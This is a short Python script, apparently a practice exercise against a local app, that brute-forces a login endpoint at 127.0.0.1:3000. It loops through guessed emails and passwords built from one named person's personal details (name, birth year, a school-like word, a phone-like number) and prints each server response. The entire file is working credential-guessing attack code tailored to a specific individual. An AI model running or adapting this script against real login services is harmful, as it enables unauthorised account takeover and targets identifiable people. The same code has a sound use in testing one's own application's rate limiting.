import json
import time

import requests

url = "http://127.0.0.1:3000/login"
possible_emails = [
    "aashish@gmail.com",
    "aashish2002@gmail.com",
    "aashishchapain@gmail.com",
    "chapainaashish@example.com",
    "aashishchapain2002@gmail.com",
]
possible_passwords = ["aashish", "nepal", "janapriya", "98012345678", "2002aashish"]

for email in possible_emails:
    for password in possible_passwords:
        time.sleep(1)
        payload = {"email": email, "password": password}
        response = requests.post(
            url, data=json.dumps(payload), headers={"Content-Type": "application/json"}
        )
        data = response.json()
        print("Email:", email)
        print("Password:", password)
        print("Status:", data["status"])
        print("Message:", data["message"])
        print("-------------------------------")
